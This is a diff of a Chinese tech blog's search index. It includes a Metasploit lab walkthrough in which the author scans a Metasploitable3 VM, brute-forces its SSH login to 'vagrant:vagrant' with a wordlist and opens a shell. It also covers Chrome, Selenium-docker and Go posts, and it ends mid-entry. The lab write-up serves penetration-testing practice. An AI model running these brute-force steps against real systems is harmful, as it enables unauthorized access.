auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 2 </span><br></pre></td></tr></table></figure>
+
+<h4 id="auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login-pubkey"><a href="#auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login-pubkey" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey"></a>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey</h4><p><strong>结论：测试失败，查看了官网的issue，以及关闭了同样问题，但我这边还是如此，我怀疑是因为靶场是win2008引起的，等把win系列靶场大概过一遍后，搭建个linux靶场试试</strong></p>
+<p>如何才能得到靶场上的ssh_pubkey?</p>
+<ul>
+<li>打开<code>C:\Users\vagrant\.ssh\</code>目录可以得到ssh的key</li>
+</ul>
+<p><img src="/aposts/2b1b6be5/image-20220301094010774.png" alt="image-20220301094010774"></p>
+<ul>
+<li>设置靶场的共享文件夹，把ssh文件复制出来</li>
+</ul>
+<p><img src="/aposts/2b1b6be5/image-20220301100740502.png" alt="image-20220301100740502"></p>
+<p><img src="/aposts/2b1b6be5/image-20220301100806933.png" alt="image-20220301100806933"></p>
+<ul>
+<li>把ssh是key文件拷贝到共享文件夹下面即可</li>
+</ul>
+<p><img src="/aposts/2b1b6be5/image-20220301100848424.png" alt="image-20220301100848424"></p>
+<ul>
+<li>把key的内容复制粘贴到kali中</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/local]</span><br><span class="line">└─$ sudo vi ssh_key                                                                                                                                                                                                        </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzIw+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoPkcmF0aYet2PkEDo3MlTBckFXPITAMzF8dJSIFo9D8HfdOV0IAdx4O7PtixWKn5y2hMNG0zQPyUecp4pzC6kivAIhyfHilFR61RGL+GPXQ2MWZWFYbAGjyiYJnAmCP3NOTd0jMZEnDkbUvxhMmBYSdETk1rRgm+R4LOzFUGaHqHDLKLX+FIPKcF96hrucXzcWyLbIbEgE98OHlnVYCzRdK8jlqm8tehUc9c9WhQ== vagrant insecure public key                           </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进入到msfconsole中，使用辅助模块，开始攻击</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; show options</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set key_path /usr/local/ssh_key </span><br><span class="line">key_path =&gt; /usr/local/ssh_key</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set rhosts 192.168.56.105</span><br><span class="line">rhosts =&gt; 192.168.56.105</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set username vagrant</span><br><span class="line">username =&gt; vagrant</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>补充知识：靶场中可以使用 C:\Program Files\OpenSSH\bin&gt;ssh-keygen -t rsa 生成私钥（id_rsa）和公钥(id_rsa.pub)</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Metasploit</category>
+      </categories>
+      <tags>
+        <tag>安全测试</tag>
+        <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Metasploitable3靶场搭建</title>
     <url>/aposts/f3700316/</url>
     <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
@@ -2554,78 +2626,6 @@
         <tag>安全测试</tag>
         <tag>Metasploit</tag>
         <tag>环境搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit-ssh攻击</title>
-    <url>/aposts/2b1b6be5/</url>
-    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本编主要演示Metasploit对ftp的攻击，必须提前搭建好Metasploit攻击机和Metasploitable3靶场，可以参考这篇<a href="/aposts/403e45c/">如何搭建kail</a>和<a href="/aposts/f3700316/">Metasploitable3靶场搭建</a></p>
-<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><ul>
-<li>流程基本上和之前的ftp攻击差不多</li>
-<li>在攻击机上，扫描靶场的端口，发现了ssh服务的端口为22，版本为7.1</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.56.105                                                                                                                                                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 22:33 EST</span><br><span class="line">Nmap scan report for 192.168.56.105</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 981 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE              VERSION</span><br><span class="line">21/tcp    open  ftp                  Microsoft ftpd</span><br><span class="line">22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http                 Microsoft IIS httpd 7.5</span><br><span class="line">135/tcp   open  msrpc                Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3306/tcp  open  mysql                MySQL 5.5.20-log</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>直接输入<code>msfconsole</code> 就进入到了metasploit 的控制台下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.14-dev                          ]</span><br><span class="line">+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Open an interactive Ruby terminal with </span><br><span class="line">irb</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure>
-
-<h3 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h3><ul>
-<li><p>本次扫描只是这对服务器上的ssh使用版本进行扫描，看看是否可以展示一些有用信息</p>
-</li>
-<li><p>输入<code>search ssh_version</code></p>
-</li>
-</ul>
-<p><img src="/aposts/2b1b6be5/image-20220228155411962.png" alt="image-20220228155411962"></p>
-<ul>
-<li>输入<code>use auxiliary/scanner/ssh/ssh_version</code>以及进行配置</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; show options</span><br><span class="line"></span><br><span class="line">  Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-</span><br><span class="line">   RPORT    22               yes       The target port (TCP)</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT  30               yes       Timeout for the SSH probe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.56.105</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; run</span><br><span class="line">[+] 192.168.56.105:22     - SSH server version: SSH-2.0-OpenSSH_7.1 ( service.version=7.1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.1 service.protocol=ssh fingerprint_db=ssh.banner )</span><br><span class="line">[*] 192.168.56.105:22     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="ssh-辅助模块"><a href="#ssh-辅助模块" class="headerlink" title="ssh 辅助模块"></a>ssh 辅助模块</h3><ul>
-<li>输入<code>search scanner/ssh</code>找到辅助的漏洞模块，本次打算采用<code>auxiliary/scanner/ssh/ssh_login</code>和<code>auxiliary/scanner/ssh/ssh_login_pubkey </code>进行实践</li>
-</ul>
-<p><img src="/aposts/2b1b6be5/image-20220228151521631.png" alt="image-20220228151521631"></p>
-<h4 id="auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login"><a href="#auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login"></a>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</h4><p>核心还是使用了密码字典进行爆破，发现提示success，说明爆破成功，用户名和密码为：<strong>vagrant</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用辅助模块</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.56.105</span><br><span class="line">rhosts =&gt; 192.168.56.105</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置爆破字典</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line">USERPASS_FILE =&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数量</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt;  set THREADS 14</span><br><span class="line">THREADS =&gt; 14</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始运行</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">[*] 192.168.56.105:22 - Starting bruteforce</span><br><span class="line">[+] 192.168.56.105:22 - Success: &#x27;vagrant:vagrant&#x27; &#x27;Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601&#x27;</span><br><span class="line">[*] Command shell session 1 opened (192.168.56.103:33151 -&gt; 192.168.56.105:22 ) at 2022-02-28 03:22:48 -0500</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们得到了shell(就是管理员的用户名和密码),我们可以与我们入侵的机器创建会话。<strong>vagrant</strong>账号登录，但是发现无法session登录长时间卡死，没有反应，<strong>展示没有找到解决方案，待补充</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入sessions -i后，其实就发现了当前以及登录ssh服务的session</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Id  Name  Type           Information                              Connection</span><br><span class="line">  --  ----  ----           -----------                              ----------</span><br><span class="line">  2         shell windows  SSH vagrant:vagrant (192.168.56.105:22)  192.168.56.103:43991 -&gt; 192.168.56.105:22  (192.168.56.105)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">表示使用session列表中的<span class="built_in">id</span>为2的数据，进行登录</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 2 </span><br></pre></td></tr></table></figure>
-
-<h4 id="auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login-pubkey"><a href="#auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login-pubkey" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey"></a>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey</h4><p><strong>结论：测试失败，查看了官网的issue，以及关闭了同样问题，但我这边还是如此，我怀疑是因为靶场是win2008引起的，等把win系列靶场大概过一遍后，搭建个linux靶场试试</strong></p>
-<p>如何才能得到靶场上的ssh_pubkey?</p>
-<ul>
-<li>打开<code>C:\Users\vagrant\.ssh\</code>目录可以得到ssh的key</li>
-</ul>
-<p><img src="/aposts/2b1b6be5/image-20220301094010774.png" alt="image-20220301094010774"></p>
-<ul>
-<li>设置靶场的共享文件夹，把ssh文件复制出来</li>
-</ul>
-<p><img src="/aposts/2b1b6be5/image-20220301100740502.png" alt="image-20220301100740502"></p>
-<p><img src="/aposts/2b1b6be5/image-20220301100806933.png" alt="image-20220301100806933"></p>
-<ul>
-<li>把ssh是key文件拷贝到共享文件夹下面即可</li>
-</ul>
-<p><img src="/aposts/2b1b6be5/image-20220301100848424.png" alt="image-20220301100848424"></p>
-<ul>
-<li>把key的内容复制粘贴到kali中</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/local]</span><br><span class="line">└─$ sudo vi ssh_key                                                                                                                                                                                                        </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzIw+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoPkcmF0aYet2PkEDo3MlTBckFXPITAMzF8dJSIFo9D8HfdOV0IAdx4O7PtixWKn5y2hMNG0zQPyUecp4pzC6kivAIhyfHilFR61RGL+GPXQ2MWZWFYbAGjyiYJnAmCP3NOTd0jMZEnDkbUvxhMmBYSdETk1rRgm+R4LOzFUGaHqHDLKLX+FIPKcF96hrucXzcWyLbIbEgE98OHlnVYCzRdK8jlqm8tehUc9c9WhQ== vagrant insecure public key                           </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>进入到msfconsole中，使用辅助模块，开始攻击</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; show options</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set key_path /usr/local/ssh_key </span><br><span class="line">key_path =&gt; /usr/local/ssh_key</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set rhosts 192.168.56.105</span><br><span class="line">rhosts =&gt; 192.168.56.105</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set username vagrant</span><br><span class="line">username =&gt; vagrant</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; run</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>补充知识：靶场中可以使用 C:\Program Files\OpenSSH\bin&gt;ssh-keygen -t rsa 生成私钥（id_rsa）和公钥(id_rsa.pub)</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Metasploit</category>
-      </categories>
-      <tags>
-        <tag>安全测试</tag>
-        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -4327,6 +4327,35 @@
       </categories>
   </entry>
   <entry>
+    <title>chrome无保存密码提示</title>
+    <url>/aposts/9dc1ed8/</url>
+    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
+<li>chrome导入密码后，无反应</li>
+<li>chrome保存密码，也没有任何提示</li>
+</ul>
+<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
+<li>浏览器中输入<code>chrome://flags/</code>，找到<code>Password import</code>，把值重新禁止和打开。</li>
+</ul>
+<blockquote>
+<p>此操作也使用无导入密码按钮的问题</p>
+</blockquote>
+<p><img src="/aposts/9dc1ed8/image-20220822094625395.png" alt="image-20220822094625395"></p>
+<ul>
+<li>运行中输入：<code>%LOCALAPPDATA%\Google\Chrome\User Data\Default</code>，打开Chrome保存用户信息的路径，删除已经保存的用户信息（Login开头的文件）</li>
+</ul>
+<p><img src="/aposts/9dc1ed8/image-20220822095203160.png" alt="image-20220822095203160"></p>
+<ul>
+<li>重启chrome浏览器后，无论是导入密码，还是提示密码保存功能，都已经可以了</li>
+</ul>
+]]></content>
+      <categories>
+        <category>软件使用</category>
+      </categories>
+      <tags>
+        <tag>chrome</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>centos7搭建jforum</title>
     <url>/aposts/65807ab6/</url>
     <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>作为性能测试的压测目标网站，本次教程主要是在centos7上搭建iforum论坛的步骤</p>
@@ -4426,35 +4455,6 @@
       </tags>
   </entry>
   <entry>
-    <title>chrome无保存密码提示</title>
-    <url>/aposts/9dc1ed8/</url>
-    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
-<li>chrome导入密码后，无反应</li>
-<li>chrome保存密码，也没有任何提示</li>
-</ul>
-<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
-<li>浏览器中输入<code>chrome://flags/</code>，找到<code>Password import</code>，把值重新禁止和打开。</li>
-</ul>
-<blockquote>
-<p>此操作也使用无导入密码按钮的问题</p>
-</blockquote>
-<p><img src="/aposts/9dc1ed8/image-20220822094625395.png" alt="image-20220822094625395"></p>
-<ul>
-<li>运行中输入：<code>%LOCALAPPDATA%\Google\Chrome\User Data\Default</code>，打开Chrome保存用户信息的路径，删除已经保存的用户信息（Login开头的文件）</li>
-</ul>
-<p><img src="/aposts/9dc1ed8/image-20220822095203160.png" alt="image-20220822095203160"></p>
-<ul>
-<li>重启chrome浏览器后，无论是导入密码，还是提示密码保存功能，都已经可以了</li>
-</ul>
-]]></content>
-      <categories>
-        <category>软件使用</category>
-      </categories>
-      <tags>
-        <tag>chrome</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>django+vue下载excel</title>
     <url>/aposts/d6f6ea0/</url>
     <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次代码主要是针对vue下载excel文件</p>
@@ -4474,6 +4474,62 @@
       <tags>
         <tag>vue</tag>
         <tag>django</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker之docker-compose安装selenium</title>
+    <url>/aposts/c43e961e/</url>
+    <content><![CDATA[<ul>
+<li>在服务器上安装<code>docker-compose</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>把本地<code>windows10</code>中的中文字体(<code>C:\Windows\Fonts</code>)随便选择几种拷贝到服务器的路径（<code>/usr/local/selenium_grid/fonts</code>）</li>
+</ul>
+<p><img src="/aposts/c43e961e/image-20220324193321079.png" alt="image-20220324193321079"></p>
+<ul>
+<li>查看字体</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/selenium_grid/fonts</span><br><span class="line">[root@VM-24-13-centos fonts]# ll</span><br><span class="line">总用量 65268</span><br><span class="line">-rw-r--r-- 1 root root 16829116 3月  24 18:15 msyhbd.ttc</span><br><span class="line">-rw-r--r-- 1 root root 12139380 3月  24 18:15 msyhl.ttc</span><br><span class="line">-rw-r--r-- 1 root root 19647736 3月  24 18:14 msyh.ttc</span><br><span class="line">-rw-r--r-- 1 root root 18214472 3月  24 18:15 simsun.ttc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>编写<code>compose.yml</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome: </span><br><span class="line">  image: selenium/node-chrome:3.8.1</span><br><span class="line">  links:</span><br><span class="line">    - hub:hub # 这里是把挂载到hub下面的意思</span><br><span class="line">  ports: </span><br><span class="line">    - &quot;5902:5900&quot; # 给vnc调试用</span><br><span class="line">  environment: </span><br><span class="line">    - NODE_MAX_INSTANCES=5 # 实例化和下面参数一般保持一致，可以多机并行</span><br><span class="line">    - NODE_MAX_SESSION=5</span><br><span class="line">    - SCREEN_WIDTH=1920 </span><br><span class="line">    - SCREEN_HEIGHT=1080 </span><br><span class="line">  volumes:</span><br><span class="line">    - /dev/shm:/dev/shm # 挂载这个持久化数据，据说是为了防止不同的闪退</span><br><span class="line">    - ./fonts:/usr/share/fonts # 把中文字体挂载进来，解决截图乱码问题</span><br><span class="line"></span><br><span class="line">hub: </span><br><span class="line">  image: selenium/hub:3.8.1</span><br><span class="line">  ports: </span><br><span class="line">    - &quot;7777:4444&quot; # 7777为外部web访问端口</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行compose，<code>-d</code>表示后台执行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看下镜像和容器</li>
+</ul>
+<p><img src="/aposts/c43e961e/image-20220323192225606.png" alt="image-20220323192225606"></p>
+<p><img src="/aposts/c43e961e/image-20220323192256161.png" alt="image-20220323192256161"></p>
+<ul>
+<li>远程查看下，输入：<code>http://ip:7777/grid/console/?config=true&amp;configDebug=true</code></li>
+</ul>
+<p><img src="/aposts/c43e961e/image-20220323192506464.png" alt="image-20220323192506464"></p>
+<ul>
+<li>编写测试代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> pip3 install selenium</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">print(11111)</span><br><span class="line"># ip = &quot;远程ip&quot;</span><br><span class="line">ip = &quot;localhost&quot;</span><br><span class="line">driver = webdriver.Remote(</span><br><span class="line">    command_executor=&quot;http://%s:7777/wd/hub&quot; %ip,</span><br><span class="line">    desired_capabilities=DesiredCapabilities.CHROME</span><br><span class="line">)</span><br><span class="line">print(22222)</span><br><span class="line"></span><br><span class="line">def test(i):</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    driver.get(&quot;https://www.baidu.com&quot;)</span><br><span class="line">    print(driver.title, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test(1)</span><br><span class="line">    driver.close()</span><br><span class="line">    driver.quit()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无论是本地还是服务器运行测试代码已经通过</li>
+</ul>
+<p><img src="/aposts/c43e961e/image-20220323192620673.png" alt="image-20220323192620673"></p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>自动化测试</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -4591,62 +4647,6 @@
         <category>docker</category>
       </categories>
       <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker之docker-compose安装selenium</title>
-    <url>/aposts/c43e961e/</url>
-    <content><![CDATA[<ul>
-<li>在服务器上安装<code>docker-compose</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>把本地<code>windows10</code>中的中文字体(<code>C:\Windows\Fonts</code>)随便选择几种拷贝到服务器的路径（<code>/usr/local/selenium_grid/fonts</code>）</li>
-</ul>
-<p><img src="/aposts/c43e961e/image-20220324193321079.png" alt="image-20220324193321079"></p>
-<ul>
-<li>查看字体</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/selenium_grid/fonts</span><br><span class="line">[root@VM-24-13-centos fonts]# ll</span><br><span class="line">总用量 65268</span><br><span class="line">-rw-r--r-- 1 root root 16829116 3月  24 18:15 msyhbd.ttc</span><br><span class="line">-rw-r--r-- 1 root root 12139380 3月  24 18:15 msyhl.ttc</span><br><span class="line">-rw-r--r-- 1 root root 19647736 3月  24 18:14 msyh.ttc</span><br><span class="line">-rw-r--r-- 1 root root 18214472 3月  24 18:15 simsun.ttc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>编写<code>compose.yml</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome: </span><br><span class="line">  image: selenium/node-chrome:3.8.1</span><br><span class="line">  links:</span><br><span class="line">    - hub:hub # 这里是把挂载到hub下面的意思</span><br><span class="line">  ports: </span><br><span class="line">    - &quot;5902:5900&quot; # 给vnc调试用</span><br><span class="line">  environment: </span><br><span class="line">    - NODE_MAX_INSTANCES=5 # 实例化和下面参数一般保持一致，可以多机并行</span><br><span class="line">    - NODE_MAX_SESSION=5</span><br><span class="line">    - SCREEN_WIDTH=1920 </span><br><span class="line">    - SCREEN_HEIGHT=1080 </span><br><span class="line">  volumes:</span><br><span class="line">    - /dev/shm:/dev/shm # 挂载这个持久化数据，据说是为了防止不同的闪退</span><br><span class="line">    - ./fonts:/usr/share/fonts # 把中文字体挂载进来，解决截图乱码问题</span><br><span class="line"></span><br><span class="line">hub: </span><br><span class="line">  image: selenium/hub:3.8.1</span><br><span class="line">  ports: </span><br><span class="line">    - &quot;7777:4444&quot; # 7777为外部web访问端口</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>执行compose，<code>-d</code>表示后台执行</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看下镜像和容器</li>
-</ul>
-<p><img src="/aposts/c43e961e/image-20220323192225606.png" alt="image-20220323192225606"></p>
-<p><img src="/aposts/c43e961e/image-20220323192256161.png" alt="image-20220323192256161"></p>
-<ul>
-<li>远程查看下，输入：<code>http://ip:7777/grid/console/?config=true&amp;configDebug=true</code></li>
-</ul>
-<p><img src="/aposts/c43e961e/image-20220323192506464.png" alt="image-20220323192506464"></p>
-<ul>
-<li>编写测试代码</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> pip3 install selenium</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">print(11111)</span><br><span class="line"># ip = &quot;远程ip&quot;</span><br><span class="line">ip = &quot;localhost&quot;</span><br><span class="line">driver = webdriver.Remote(</span><br><span class="line">    command_executor=&quot;http://%s:7777/wd/hub&quot; %ip,</span><br><span class="line">    desired_capabilities=DesiredCapabilities.CHROME</span><br><span class="line">)</span><br><span class="line">print(22222)</span><br><span class="line"></span><br><span class="line">def test(i):</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    driver.get(&quot;https://www.baidu.com&quot;)</span><br><span class="line">    print(driver.title, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test(1)</span><br><span class="line">    driver.close()</span><br><span class="line">    driver.quit()</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>无论是本地还是服务器运行测试代码已经通过</li>
-</ul>
-<p><img src="/aposts/c43e961e/image-20220323192620673.png" alt="image-20220323192620673"></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>自动化测试</tag>
         <tag>docker</tag>
       </tags>
   </entry>
@@ -5996,51 +5996,6 @@
       </tags>
   </entry>
   <entry>
-    <title>go 操作mysql</title>
-    <url>/aposts/481094f/</url>
-    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
-<li>对mysql的操作采用了两种，第一种是写原生sql，使用如下两个库</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;github.com/go-sql-driver/mysql&quot;</span><br><span class="line">&quot;github.com/jmoiron/sqlx&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>第二种采用orm，使用了如下库</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;gorm.io/driver/mysql&quot;</span><br><span class="line">&quot;gorm.io/gorm&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul>
-<li>本地搭建好mysql环境，数据库和表名如下</li>
-</ul>
-<p><img src="/aposts/481094f/image-20230608170552494.png" alt="image-20230608170552494"></p>
-<h3 id="原生sql"><a href="#原生sql" class="headerlink" title="原生sql"></a>原生sql</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/tmysql/operateMsql.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> tmysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jmoiron/sqlx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go get github.com/go-sql-driver/mysql</span></span><br><span class="line"><span class="comment">//go get 